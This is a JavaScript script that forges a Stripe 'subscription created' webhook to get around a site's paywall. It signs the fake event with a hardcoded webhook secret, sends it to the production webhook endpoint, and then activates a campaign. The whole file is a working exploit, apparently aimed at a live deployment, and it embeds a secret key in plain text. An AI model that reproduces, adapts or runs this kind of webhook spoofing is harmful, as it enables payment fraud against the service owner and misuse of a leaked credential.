async function bypassPaywall() {
  const secret = "whsec_f966zfiMzWxSRwYfDxeIhG985LaIfovS";
  
  // 1. Get the current user's stripeCustomerId
  const sessionRes = await fetch("/api/auth/session");
  const session = await sessionRes.json();
  let customerId = session?.user?.stripeCustomerId;
  
  if (!customerId) {
    console.log("No customer ID found. Initializing checkout to create one...");
    await fetch("/api/stripe/checkout", { method: "POST" });
    const retryRes = await fetch("/api/auth/session");
    const retrySession = await retryRes.json();
    customerId = retrySession?.user?.stripeCustomerId;
    if (!customerId) throw new Error("Still no customer ID");
  }
  
  console.log("Using customer ID:", customerId);

  // 2. Prepare the Stripe webhook payload
  const payload = {
    id: "evt_mock_subscription",
    object: "event",
    type: "customer.subscription.created",
    data: {
      object: {
        id: "sub_founder_bypass",
        object: "subscription",
        customer: customerId,
        status: "active"
      }
    }
  };
  
  const payloadStr = JSON.stringify(payload);
  const timestamp = Math.floor(Date.now() / 1000).toString();
  const signedPayload = `${timestamp}.${payloadStr}`;
  
  // 3. Generate HMAC SHA256 Signature
  const enc = new TextEncoder();
  const key = await crypto.subtle.importKey(
    "raw",
    enc.encode(secret),
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"]
  );
  
  const signatureBuffer = await crypto.subtle.sign("HMAC", key, enc.encode(signedPayload));
  const signatureArray = Array.from(new Uint8Array(signatureBuffer));
  const signatureHex = signatureArray.map(b => b.toString(16).padStart(2, '0')).join('');
  const stripeSignature = `t=${timestamp},v1=${signatureHex}`;
  
  // 4. Send the fake webhook
  console.log("Sending spoofed webhook to Vercel production...");
  const webhookRes = await fetch("/api/webhooks/stripe", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Stripe-Signature": stripeSignature
    },
    body: payloadStr
  });
  
  console.log("Webhook response:", await webhookRes.text());
  
  if (webhookRes.ok) {
    console.log("Subscription bypassed! Activating campaign...");
    const patchRes = await fetch("/api/campaigns", {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ status: "active" })
    });
    console.log("Patch response:", await patchRes.text());
    window.location.reload();
  }
}

bypassPaywall().catch(console.error);
